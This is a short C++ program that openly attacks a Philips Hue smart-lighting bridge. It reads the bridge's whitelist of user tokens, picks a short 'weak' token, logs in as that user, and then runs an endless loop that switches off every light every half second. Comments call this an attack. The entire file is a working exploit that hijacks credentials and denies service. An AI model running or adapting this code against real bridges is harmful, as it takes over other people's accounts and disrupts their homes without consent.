////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
// DMC_NODE
//
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#include <iostream>
#include <fstream>
#include <cjson/json.h>
#include <backEnd/deviceDrivers/HueDriver.h>

using namespace cjson;
using namespace std;
using namespace dmc::hue;


Json config;
HueDriver* gDriver = nullptr;

int main(int, const char**) {
	// Init hue driver
	config.parse(fstream("config.json"));
	HueDriver::init(config["bridge"]);
	gDriver = HueDriver::get();

	// Get whitelist users
	Json bridgeData;
	gDriver->getData("/config/", bridgeData, cout);
	Json whitelist = bridgeData["whitelist"];
	// Find a weak user token
	string token = "";
	for (auto i = whitelist.begin(); i != whitelist.end(); ++i) {
		if (i.key().size() < 32 && i.key() != "newdeveloper") // Weak token
		{
			token = i.key();
			break;
		}
	}
	// Try to attack
	if (!token.empty()) {
		// Reset driver with new user
		config["bridge"]["user"] = token;
		HueDriver::end();
		HueDriver::init(config["bridge"]);
		gDriver = HueDriver::get();

		for (;;) {
			// Get lights list
			std::vector<std::string> lights;
			Json lightsData;
			gDriver->getData("/lights/", lightsData, cout);
			for (auto i = lightsData.begin(); i != lightsData.end(); ++i)
				lights.push_back(i.key());
			
			// Turn all lights off
			Json off;
			off.parse("{\"on\": false}");
			for (auto l : lights) { // Iterate over all lights
				string url = string("/lights/") + l + "/state";
				gDriver->putData(url, off, cout);
			}

			Sleep(500);
		}
	}
	else {
		cout << "Can't find any user to attack\n";
	}
}